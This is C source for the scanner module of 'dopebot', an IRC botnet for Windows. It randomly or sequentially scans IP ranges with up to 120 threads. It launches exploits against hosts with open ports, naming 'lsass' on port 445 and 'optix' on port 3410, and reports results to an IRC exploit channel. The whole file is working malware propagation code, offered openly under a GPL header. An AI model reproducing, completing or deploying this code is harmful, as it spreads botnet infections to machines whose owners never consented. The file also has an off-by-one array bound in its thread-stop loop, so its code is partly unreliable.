/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_SCANNER
#include "bt1.h"

//GLOBALS, YET AGAIN! FUCK!
BOOL bIsScanning = FALSE;
CRITICAL_SECTION ct;
HANDLE hThreads[120];
ULONG cip = 0;

//"Test Exploit"
bool httpchk(exploitinfo exinfo)
{
	char szBuffer[IRCBUF];
		sprintf(szBuffer, "[HTTPCHK] %s:%i", exinfo.szIP, exinfo.iPort);
		irc_msg(exinfo.bsock, "PRIVMSG", (char *)exploitchannel, szBuffer);
		printf("%s\n", szBuffer);
		return TRUE;
}

//Exploits
exploits exp[] =
{
	{"test", 80, httpchk},
#ifndef NO_LSASS
	{"lsass", 445, rootlsass},
#endif

#ifndef NO_OPTIX
	{"optix", 3410, rootoptix},
#endif

};

//Get Current IP
void get_current_ip(char *szBuffer)
{
	
#ifndef NO_DEBUG
		printf("[DEBUG] Getting current ip scanned, getcurrentip()...\n");
#endif

	if (!bIsScanning) 
	{
			sprintf(szBuffer, "[SCAN] no scan running!");
			return;
	}	
		EnterCriticalSection(&ct);
		sprintf(szBuffer, "[SCAN] currently scanning: %s", inet_ntoa(*(PIN_ADDR)&cip));
		LeaveCriticalSection(&ct);
		return;
}

//Get Next Random IP
void get_next_ip_rnd(char *szIP, char *szBuffer)
{
	char x1[4], x2[4], x3[4], x4[4];

#ifndef NO_DEBUG
		printf("[DEBUG] Getting random ip, getnextiprnd()...\n");
#endif

		srand(GetTickCount());
		sscanf(szIP, "%[^.].%[^.].%[^.].%[^.]", x1, x2, x3, x4);
	if (lstrcmpi(x1, "0") == 0) sprintf(x1, "%i", rand()%255);
	if (lstrcmpi(x2, "0") == 0) sprintf(x2, "%i", rand()%255);
	if (lstrcmpi(x3, "0") == 0) sprintf(x3, "%i", rand()%255);
	if (lstrcmpi(x4, "0") == 0) sprintf(x4, "%i", rand()%255);
		sprintf(szBuffer, "%s.%s.%s.%s", x1, x2, x3, x4);
		return;
}

//Is Port Open
bool is_port_open(char *szIP, int iPort, int iDelay)
{
	FD_SET fdset;
	FD_ZERO (&fdset);
	int i;
	SOCKET sock;
	struct sockaddr_in sin;
	TIMEVAL timeout;
	unsigned long cmd = 1;
//	WSADATA wsadata;

#ifndef NO_DEBUG
		printf("[DEBUG] Checking if port is open, isportopen()...\n");
#endif

//	if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0) return FALSE;
		sin.sin_family = AF_INET;
		sin.sin_port = htons(iPort);
		sin.sin_addr.s_addr = inet_addr(szIP);
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) return FALSE;
		ioctlsocket(sock, FIONBIO, &cmd);
		connect(sock, (struct sockaddr *)&sin, sizeof(sin));
		timeout.tv_sec = iDelay / 100;
//		timeout.tv_usec = 0;
		FD_SET (sock, &fdset);
		i = select(0, 0, &fdset, 0, &timeout);
		closesocket(sock);
//		WSACleanup();
	if (i <= 0) 
		return FALSE;
	else 
		return TRUE;
}

//Scan Main
DWORD WINAPI scan_main(LPVOID param)
{
	char szBuffer[IRCBUF];
	scanner scn = *((scanner *)param);

#ifndef NO_DEBUG
		printf("[DEBUG] Starting scan thread, scanmain()...\n");
#endif

	while(1)
	{
		if (!bIsScanning) ExitThread(0);
		if (scn.bRandom)
		{
				EnterCriticalSection(&ct);
				get_next_ip_rnd(scn.szIP, szBuffer);
				cip = inet_addr((const char *)szBuffer);
				LeaveCriticalSection(&ct);
		}
		else 
		{
				EnterCriticalSection(&ct);
				cip = htonl(htonl(cip) + 1);
				LeaveCriticalSection(&ct);
		}
		if (is_port_open(inet_ntoa(*(PIN_ADDR)&cip), scn.iPort, scn.iDelay))
		{
			if (scn.bExploit) 
			{
					EnterCriticalSection(&ct);
				exploitinfo exinfo;
					sprintf(exinfo.szIP, inet_ntoa(*(PIN_ADDR)&cip));
					exinfo.iPort = scn.iPort;
					exinfo.bsock = scn.bsock;
					exp[scn.iExploit].exfunc((exinfo));
					LeaveCriticalSection(&ct);
			}
			else
			{
					EnterCriticalSection(&ct);
					sprintf(szBuffer, "%s has port %i open.", inet_ntoa(*(PIN_ADDR)&cip), scn.iPort);
					irc_msg(scn.bsock, scn.szAction, scn.szChannel, szBuffer);
					LeaveCriticalSection(&ct);
			}
		}
			Sleep(500);
	}
		ExitThread(0);
		return 0;
}

//Scan Start
DWORD WINAPI scan_start(LPVOID param)
{
	char szBuffer[IRCBUF];
	DWORD dwID;
	int i;
	scanner scn1 = *((scanner *)param);
	struct scanner scn;

#ifndef NO_DEBUG
		printf("[DEBUG] Starting scan, scanstart()...\n");
#endif

	if (bIsScanning)
	{
			irc_msg(scn1.bsock, scn1.szAction, scn1.szChannel, "[SCAN] scan already running!");
			return 0;
	}
		InitializeCriticalSection(&ct);
		cip = inet_addr((const char *)scn1.szIP);
		sprintf(scn.szIP, scn1.szIP);
	if (scn1.bExploit)
	{
		for (i = 0; i < ARRAYSIZE(exp); i++)
		{
			if (lstrcmpi(scn1.szExploit, exp[i].szName) == 0)
			{
					scn.iPort = exp[i].iPort;
					scn.iExploit = i;
				goto cont;
			}
		}
	}
	else scn.iPort = scn1.iPort;
cont:
		sprintf(scn.szExploit, scn1.szExploit);
		scn.bExploit = scn1.bExploit;
		scn.iDelay = scn1.iDelay;
		scn.bRandom = scn1.bRandom;
		scn.bsock = scn1.bsock;
		sprintf(scn.szAction, scn1.szAction);
		bIsScanning = TRUE;
	if (!scn1.bRandom)
	{
		if (scn1.bExploit)
			sprintf(szBuffer, "[SCAN] sequential exploitscan started on: %s, exploit: %s, delay: %i, threads %i.", scn1.szIP, scn1.szExploit, scn1.iDelay, scn1.iThreads);
		else
			sprintf(szBuffer, "[SCAN] sequential portscan started on: %s, port: %i, delay: %i, threads %i.", scn1.szIP, scn1.iPort, scn1.iDelay, scn1.iThreads);
	}
	else
	{
		if (scn1.bExploit)
			sprintf(szBuffer, "[SCAN] random exploitscan started on: %s, exploit: %s, delay: %i, threads %i.", scn1.szIP, scn1.szExploit, scn1.iDelay, scn1.iThreads);
		else
			sprintf(szBuffer, "[SCAN] random portscan started on: %s, port: %i, delay: %i, threads %i.", scn1.szIP, scn1.iPort, scn1.iDelay, scn1.iThreads);
	}
		irc_msg(scn1.bsock, scn1.szAction, scn1.szChannel, szBuffer);
	for (i = 1; i <= scn1.iThreads;i++)
	{
		if (!bIsScanning) break;
			hThreads[i] = CreateThread(NULL, 0, &scan_main, (void *)&scn, 0, &dwID);
			Sleep(100);
	}
		return TRUE;
}

//Scan Stop
bool scan_stop()
{
	int i;
	if (!bIsScanning) return FALSE;

#ifndef NO_DEBUG
		printf("[DEBUG] Stopping scan, scanstop()...\n");
#endif

		bIsScanning = FALSE;
	for (i = 1; i <= 120;i++)
	{
			LeaveCriticalSection(&ct);
			TerminateThread(hThreads[i], 0);
			CloseHandle(hThreads[i]);
	}
		DeleteCriticalSection(&ct);
		cip = 0;
		return TRUE;
}
#endif
